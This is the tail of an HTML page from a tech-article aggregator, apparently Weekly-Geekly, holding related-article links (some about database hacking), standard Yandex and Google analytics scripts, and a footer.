<li><a href="../256663/index.html">Attack on the oracle. Detailed Guide for Oracle DB Attack Vectors</a></li>
<li><a href="../256665/index.html">We play with muscles. Methods and tools for hacking MySQL databases</a></li>
<li><a href="../256669/index.html">The digest of interesting materials from the world of web development and IT for the last week ‚Ññ157 (April 20 - 26, 2015)</a></li>
<li><a href="../256671/index.html">Jeff Atwood: ‚ÄúYour password is too short!‚Äù</a></li>
<li><a href="../256675/index.html">Information security in open projects, report from RIF + CIB 2015</a></li>
<li><a href="../256679/index.html">Let's look behind the scenes of development: a selection of source codes of classic games</a></li>
<li><a href="../256683/index.html">Euphoria Module: a short 3D animation created using open source software</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>